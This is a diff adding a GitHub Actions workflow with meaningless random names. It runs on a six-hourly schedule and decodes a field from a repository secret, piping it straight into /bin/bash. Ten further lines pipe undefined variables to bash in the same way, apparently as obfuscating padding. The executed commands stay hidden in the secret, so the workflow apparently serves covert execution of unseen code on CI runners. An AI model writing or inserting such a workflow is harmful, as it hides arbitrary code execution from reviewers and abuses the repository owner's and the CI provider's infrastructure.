@@ -1,0 +1,28 @@
+name: circlechapter
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '22 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: circlechapter
+        env:
+          qitsd80813: ${{ secrets.qitsd80813 }}
+        run: |
+          echo $qitsd80813 | jq -r .ruk60 | /bin/bash
+          echo $ugvj84 | jq -r .ym2157 | /bin/bash
+          echo $wphf67 | jq -r .mv6793 | /bin/bash
+          echo $epby6439 | jq -r .ddpgm11939 | /bin/bash
+          echo $raf459 | jq -r .bjrum21878 | /bin/bash
+          echo $egny7922 | jq -r .o210 | /bin/bash
+          echo $pacg180 | jq -r .hd348 | /bin/bash
+          echo $jw5191 | jq -r .vwsk821 | /bin/bash
+          echo $oeg7090 | jq -r .i25903 | /bin/bash
+          echo $ltyw3956 | jq -r .xu18362 | /bin/bash
+          echo $x9 | jq -r .ud96297 | /bin/bash
+
